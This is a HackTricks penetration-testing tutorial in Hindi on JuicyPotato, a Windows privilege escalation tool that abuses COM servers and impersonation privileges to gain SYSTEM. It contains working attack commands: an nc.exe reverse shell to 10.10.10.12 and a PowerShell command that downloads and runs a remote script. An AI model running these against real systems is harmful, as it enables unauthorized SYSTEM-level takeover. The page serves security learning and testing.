# JuicyPotato

<details>

<summary><strong>जीरो से हीरो तक AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong> के साथ!</strong></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी को HackTricks में विज्ञापित देखना चाहते हैं**? या क्या आपको **PEASS के नवीनतम संस्करण या HackTricks को PDF में डाउनलोड करने का एक्सेस चाहिए**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) की जाँच करें!
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family) की खोज करें, हमारा विशेष [**NFTs**](https://opensea.io/collection/the-peass-family) संग्रह।
* [**आधिकारिक PEASS और HackTricks स्वैग**](https://peass.creator-spring.com) प्राप्त करें।
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या **मुझे** **Twitter** पर **फॉलो** करें 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**।**
* **अपने हैकिंग ट्रिक्स साझा करें, PRs सबमिट करके** [**hacktricks रेपो**](https://github.com/carlospolop/hacktricks) **और** [**hacktricks-cloud रेपो**](https://github.com/carlospolop/hacktricks-cloud) **को फॉलो** करें।

</details>

{% hint style="warning" %}
**JuicyPotato** Windows Server 2019 और Windows 10 बिल्ड 1809 के ऊपर काम नहीं करता है। हालांकि, [**PrintSpoofer**](https://github.com/itm4n/PrintSpoofer)**,** [**RoguePotato**](https://github.com/antonioCoco/RoguePotato)**,** [**SharpEfsPotato**](https://github.com/bugch3ck/SharpEfsPotato) का उपयोग किया जा सकता है ताकि **उसी विशेषाधिकारों का उपयोग करें और `NT AUTHORITY\SYSTEM` स्तर का एक्सेस प्राप्त करें**। _**जांचें:**_
{% endhint %}

{% content-ref url="roguepotato-and-printspoofer.md" %}
[roguepotato-and-printspoofer.md](roguepotato-and-printspoofer.md)
{% endcontent-ref %}

## Juicy Potato (स्वर्ण विशेषाधिकारों का दुरुपयोग) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>

_**RottenPotatoNG**_ [_का एक चीनी रूपांतरण, थोड़ी मिठास के साथ, अर्थात एक और स्थानीय विशेषाधिकार उन्नति उपकरण, विंडोज सेवा खातों से NT AUTHORITY\SYSTEM तक_]

#### आप juicypotato को [यहाँ से डाउनलोड कर सकते हैं](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)

### सारांश <a href="#summary" id="summary"></a>

**[Juicy-potato Readme से](https://github.com/ohpe/juicy-potato/blob/master/README.md):**

[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) और इसके [वेरिएंट्स](https://github.com/decoder-it/lonelypotato) [`BITS`](https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799\(v=vs.85\).aspx) [सेवा](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) पर आधारित विशेषाधिकार उन्नति श्रृंखला का उपयोग करता है जिसमें `127.0.0.1:6666` पर MiTM सुनने वाला होता है और जब आपके पास `SeImpersonate` या `SeAssignPrimaryToken` विशेषाधिकार होते हैं। एक विंडोज निर्माण समीक्षा के दौरान हमने एक सेटअप पाया जहां `BITS` को इच्छित रूप से अक्षम किया गया था और पोर्ट `6666` लिया गया था।

हमने [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) को शस्त्रीकृत करने का निर्णय लिया: **Juicy Potato का स्वागत करें**।

> सिद्धांत के लिए, [Rotten Potato - सेवा खातों से सिस्टम तक विशेषाधिकार उन्नति](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) देखें और लिंक और संदर्भों की श्रृंखला का पालन करें।

हमने पाया कि, `BITS` के अलावा हम कई COM सर्वरों का दुरुपयोग कर सकते हैं। उन्हें बस यह करना है:

1. वर्तमान उपयोगकर्ता द्वारा instantiable होना, सामान्य रूप से एक "सेवा उपयोगकर्ता" जिसके पास अनुकरण विशेषाधिकार होते हैं
2. `IMarshal` इंटरफेस को कार्यान्वित करना
3. उच्च स्तरीय उपयोगकर्ता के रूप में चलाना (SYSTEM, प्रशासक, ...)

कुछ परीक्षण के बाद हमने कई [रोचक CLSID](http://ohpe.it/juicy-potato/CLSID/) की एक व्यापक सूची प्राप्त और परीक्षण किया। विभिन्न विंडोज संस्करणों पर।

### Juicy विवरण <a href="#juicy-details" id="juicy-details"></a>

JuicyPotato आपको निम्नलिखित करने की अनुमति देता है:

* **लक्ष्य CLSID** _आप किसी भी CLSID को चुन सकते हैं।_ [_यहाँ_](http://ohpe.it/juicy-potato/CLSID/) _आप OS द्वारा संगठित सूची पा सकते हैं।_
* **COM सुनने का पोर्ट** _आपकी पसंद के अनुसार COM सुनने का पोर्ट परिभाषित करें (मार्शल किया हार्डकोडेड 6666 के बजाय)_
* **COM सुनने का IP पता** _किसी भी IP पर सर्वर बाँधें_
* **प्रक्रिया निर्माण मोड** _अनुकरण करने वाले उपयोगकर्ता की विशेषाधिकारों के आधार पर आप `CreateProcessWithToken` (जरूरत है `SeImpersonate`), `CreateProcessAsUser` (जरूरत है `SeAssignPrimaryToken`), `दोनों` में से चुन सकते हैं।_
* **लॉन्च करने की प्रक्रिया** _यदि शोषण सफल होता है तो एक executable या स्क्रिप्ट लॉन्च करें_
* **प्रक्रिया तर्क** _लॉन्च की गई प्रक्रिया के तर्क को अनुकूलित करें_
* **RPC सर्वर पता** _एक छिपी दृष्टिकोण के लिए आप एक बाह्य RPC सर्वर से प्रमाणित कर सकते हैं_
* **RPC सर्वर पोर्ट** _उपयोगी है अगर आप एक बाह्य सर्वर से प्रमाणित होना चाहते हैं और फ़ायरवॉल पोर्ट `135` को अवरुद्ध कर रहा है..._
* **TEST मोड** _मुख्य रूप से परीक्षण के उद्देश्यों के लिए, अर्थात CLSIDs का परीक्षण। यह DCOM बनाता है और टोकन का उपयोगकर्ता प्रिंट करता है। टेस्टिंग के लिए यहाँ देखें_ [_यहाँ_](http://ohpe.it/juicy-potato/Test/)

### उपयोग <a href="#usage" id="usage"></a>
```
T:\>JuicyPotato.exe
JuicyPotato v0.1

Mandatory args:
-t createprocess call: <t> CreateProcessWithTokenW, <u> CreateProcessAsUser, <*> try both
-p <program>: program to launch
-l <port>: COM server listen port


Optional args:
-m <ip>: COM server listen address (default 127.0.0.1)
-a <argument>: command line argument to pass to program (default NULL)
-k <ip>: RPC server ip address (default 127.0.0.1)
-n <port>: RPC server listen port (default 135)
```
### अंतिम विचार <a href="#final-thoughts" id="final-thoughts"></a>

**[Juicy Potato Readme से](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts):**

यदि उपयोगकर्ता के पास `SeImpersonate` या `SeAssignPrimaryToken` विशेषाधिकार हैं तो आप **SYSTEM** हैं।

इन सभी COM सर्वरों के दुरुपयोग को रोकना लगभग असंभव है। आप इन ऑब्जेक्ट्स की अनुमतियों को `DCOMCNFG` के माध्यम से संशोधित करने के बारे में सोच सकते हैं, लेकिन शुभकामनाएं, यह कठिन होगा।

वास्तविक समाधान है कि `* SERVICE` खातों के तहत चलने वाले संवेदनशील खातों और एप्लिकेशनों को सुरक्षित रखें। `DCOM` को रोकना निश्चित रूप से इस उत्पीड़न को रोकेगा लेकिन इसके पीछे के ऑपरेटिंग सिस्टम पर गंभीर प्रभाव हो सकते हैं।

स्रोत: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)

## उदाहरण

ध्यान दें: कोशिश करने के लिए CLSIDs की सूची के लिए [इस पृष्ठ](https://ohpe.it/juicy-potato/CLSID/) पर जाएं।

### एक nc.exe रिवर्स शैल लें
```
c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *

Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
......
[+] authresult 0
{4991d34b-80a1-4291-83b6-3328366b9097};NT AUTHORITY\SYSTEM

[+] CreateProcessWithTokenW OK

c:\Users\Public>
```
### पावरशेल रेव
```
.\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
```
### नए CMD लॉन्च करें (यदि आपके पास RDP एक्सेस है)

![](<../../.gitbook/assets/image (37).png>)

## CLSID समस्याएं

अक्सर, JuicyPotato द्वारा उपयोग किया जाने वाला डिफ़ॉल्ट CLSID **काम नहीं करता** है और एक्सप्लॉइट विफल हो जाता है। सामान्यत: एक स्पष्ट ऑपरेटिंग सिस्टम के लिए कई प्रयासों की आवश्यकता होती है एक **काम करने वाला CLSID** खोजने के लिए। एक विशिष्ट ऑपरेटिंग सिस्टम के लिए प्रयास करने के लिए CLSIDs की सूची प्राप्त करने के लिए आपको इस पृष्ठ पर जाना चाहिए:

{% embed url="https://ohpe.it/juicy-potato/CLSID/" %}

### **CLSIDs की जाँच**

सबसे पहले, आपको juicypotato.exe के अलावा कुछ एक्जीक्यूटेबल्स की आवश्यकता होगी।

[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) डाउनलोड करें और इसे अपने PS सत्र में लोड करें, और [GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) डाउनलोड और एक्सीक्यूट करें। उस स्क्रिप्ट से संभावित CLSIDs की एक सूची बनाएगा।

फिर [test\_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test\_clsid.bat)(CLSID सूची और juicypotato एक्जीक्यूटेबल के लिए पथ बदलें) डाउनलोड करें और इसे एक्सीक्यूट करें। यह हर CLSID की कोशिश करना शुरू कर देगा, और **जब पोर्ट नंबर बदल जाएगा, तो इसका मतलब होगा कि CLSID काम कर गया है**।

**पैरामीटर -c** का उपयोग करके **काम करने वाले CLSIDs की जाँच करें**

## संदर्भ
* [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)

<details>

<summary><strong>जीर्ण से शुरू करके AWS हैकिंग सीखें</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

* क्या आप **साइबर सुरक्षा कंपनी** में काम करते हैं? क्या आप अपनी **कंपनी का हैकट्रिक्स में विज्ञापन देखना चाहते हैं**? या क्या आपको **PEASS के नवीनतम संस्करण या हैकट्रिक्स को पीडीएफ़ में डाउनलोड करने का एक्सेस चाहिए**? [**सब्सक्रिप्शन प्लान्स**](https://github.com/sponsors/carlospolop) की जाँच करें!
* खोजें [**द पीएस फैमिली**](https://opensea.io/collection/the-peass-family), हमारा विशेष [**एनएफटीज़**](https://opensea.io/collection/the-peass-family) संग्रह
* प्राप्त करें [**आधिकारिक पीएस और हैकट्रिक्स स्वैग**](https://peass.creator-spring.com)
* **शामिल हों** [**💬**](https://emojipedia.org/speech-balloon/) [**डिस्कॉर्ड समूह**](https://discord.gg/hRep4RUj7f) या [**टेलीग्राम समूह**](https://t.me/peass) या मुझे **ट्विटर** पर फॉलो करें 🐦[**@carlospolopm**](https://twitter.com/hacktricks_live)**.**
* **अपने हैकिंग ट्रिक्स साझा करें, हैकट्रिक्स रेपो** में पीआर जमा करके [**हैकट्रिक्स रेपो**](https://github.com/carlospolop/hacktricks) **और** [**हैकट्रिक्स-क्लाउड रेपो**](https://github.com/carlospolop/hacktricks-cloud)।

</details>
